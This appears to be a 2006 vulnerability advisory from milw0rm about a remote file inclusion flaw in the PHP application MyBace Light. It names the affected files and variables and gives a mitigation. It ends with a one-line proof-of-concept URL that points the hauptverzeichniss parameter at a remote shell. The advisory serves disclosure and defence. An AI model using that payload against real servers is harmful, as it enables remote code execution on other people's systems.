@@ -1,0 +1,60 @@
++--------------------------------------------------------------------
++
++ MyBace Light (hauptverzeichniss) Remote File Inclusion
++
++ Original advisory:
++ http://www.bb-pcsecurity.de/Websecurity/384/MyBace_Light_(hauptverzeichniss)_Remote_File_Inclusion.htm
++--------------------------------------------------------------------
++
++ Affected Software .: My Bace Light
++ Venedor ...........: http://www.onlinemacher.de/
++ Class .............: Remote File Inclusion
++ Risk ..............: high (Remote File Execution)
++ Found by ..........: Philipp Niedziela
++ Contact ...........: webmaster[at]bb-pcsecurity[.]de
++
++--------------------------------------------------------------------
++
++ Affected Files:
++  includes/login_check.php
++           var: $hauptverzeichniss
++
++  admin/login/content/user_daten.php
++           var: $template_back
++
++--------------------------------------------------------------------
++
++ $hauptverzeichniss & $template_back is not properly sanitized before being used
++
++--------------------------------------------------------------------
++
++ Solution:
++ Deny direct access to these files using a .htaccess-file
++ or modify code:
++
++ if(!isset($_REQUEST['hauptverzeichniss']) &&
+!isset($_GET['hauptverzeichniss'])
++     && !isset($_POST['hauptverzeichniss'])){
++ //code of org. *.php
++ }
++ else {
++ echo "You cannot access this file directly.";
++ die();
++ }
++
++--------------------------------------------------------------------
++
++ PoC:
++
++ http://[target]/includes/login_check.php?hauptverzeichniss=[shell]
++
++--------------------------------------------------------------------
++
++ Notice: I've tried to contact venedor 3 weeks ago, but no answer yet...
++
++
++ Greets: /str0ke
++
++-------------------------[ E O F ]----------------------------------
+
+# milw0rm.com [2006-09-01]
